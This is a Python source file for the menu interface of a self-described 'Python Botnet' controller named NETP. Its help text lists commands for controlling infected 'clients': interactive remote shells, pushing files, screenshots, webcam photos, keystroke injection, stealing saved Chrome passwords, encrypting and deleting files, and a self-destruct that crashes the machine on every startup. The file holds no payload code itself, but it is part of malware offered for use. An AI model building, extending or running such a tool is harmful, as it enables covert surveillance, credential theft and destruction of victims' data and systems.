from server import Server

class Interface:
    def __init__(self):
        pass

    def logo(self):
        print(
    """
        ███╗   ██╗███████╗████████╗██████╗ 
        ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗
        ██╔██╗ ██║█████╗     ██║   ██████╔╝
        ██║╚██╗██║██╔══╝     ██║   ██╔═══╝ 
        ██║ ╚████║███████╗   ██║   ██║     
        ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝
    Python Botnet made by Chunky#9092 on Discord
                  Type: \"help\"\n\n"""
        )
    
    def help(self):
        print(
            "\nclient - interfaces clients - Usage: client\n" +
            "list - list all clients you have - Usage: list\n" +
            "online - checks for clients that are online - Usage: online\n" +
            "exit - exits NETP - Usage: exit\n"
        )
    
    def client_help(self):
        print(
            "\nselect - individually interfaces a client - Usage: select\n" +
            "all - interfaces all clients at the same time - Usage: all\n" +
            "exit - sends back to main interface - Usage: exit\n"
        )
    
    def client_select_help(self):
        print(
            "\nsendfile - sends client the given file - Usage: sendfile\n" +
            "shell - starts an interactive shell with client - Usage: shell\n" +
            "info - shows information about the client - Usage: info\n" +
            "cc - custom commands that cannot be executed in the shell - Usage: cc\n" +
            "virus - run premade viruses on client's computer - Usage: virus\n" +
            "remove - removes client from server (permanently) - Usage: remove\n" +
            "exit - sends back to main interface - Usage: exit\n"
        )
    
    def all_help(self):
        print(
            "\nsendfile - sends client the given file - Usage: sendfile\n" +
            "cc - custom commands that cannot be executed in the shell - Usage: cc\n" +
            "virus - run premade viruses on client's computer - Usage: virus\n" +
            "remove - removes all clients from server (permanently) - Usage: remove\n" +
            "exit - sends back to main interface - Usage: exit\n"
        )
    
    def custom_cmd_help(self):
        print(
            "\nopenfile - opens a file on the client's computer - Usage: openfile file\n" +
            "closefile - closes a file on the client's computer - Usage: closefile file\n" +
            "ss - screenshot's client's screen - Usage: ss file\n" +
            "openweb - opens a website on the client's computer - Usage: openweb website\n" +
            "playsound - plays a .wav sound file already existing on the client's computer - Usage: playsound file\n" +
            "bg - set client's background image using client's local image file (WINDOWS ONLY) - Usage: bg file\n" +
            "sendkeys - Makes client's computer type ANY and ALL characters after \"sendkeys\" - Usage: sendkeys characters\n" +
            "campic - takes picture using client's webcam (may not work if they don't have webcam) - Usage: campic file\n" +
            "spkeys - Makes client's computer type special characters (Contact Chunky#9092 for keycodes) - Usage: spkeys key\n" +
            "del - deletes file on client's computer - Usage del file\n" +
            "popup - opens windows error message with title and text, \"_\" replaces spaces (WINDOWS ONLY) - Usage: popup title text\n" +
            "exit - sends back to main interface - Usage: exit\n"
        )

    def virus_help(self):
        print(
            "\nmw - wiggles client's mouse with intensity in pixels - Usage: mw intensity\n" +
            "chromepass - shows client's chrome usernames and passwords (WINDOWS ONLY) - Usage: chromepass\n" +
            "dlp - downloads and opens 1-10 pictures on clients computer using category, \"_\" replaces spaces - Usage: dlp category\n" +
            "errwin - opens specified amount fake error windows on client's computer (WINDOWS ONLY) - Usage: errwin amount\n" +
            "soo - plays a sound (client's local file) on the opening of a specified application, plays every specified amount of seconds while open - Usage: soo seconds application file\n" +
            "si - plays a sound every specified amount of seconds - Usage: si seconds file\n" +
            "encrypt - encrypts file on client's computer - Usage: encrypt file\n" +
            "decrypt - decrypts file on client's computer - Usage: decrypt file\n" +
            "selfdestruct - self destructs client side main file, cmd crashes computer (everytime on startup) and deletes itself - Usage: selfdestruct\n" +
            "stop - stops any running viruses on client's machine - Usage: stop\n" +
            "exit - sends back to main interface - Usage: exit\n"
        )
    
    def list_(self):
        [print(x.split(".")[0]) for x in Server().get_clients_cmd()]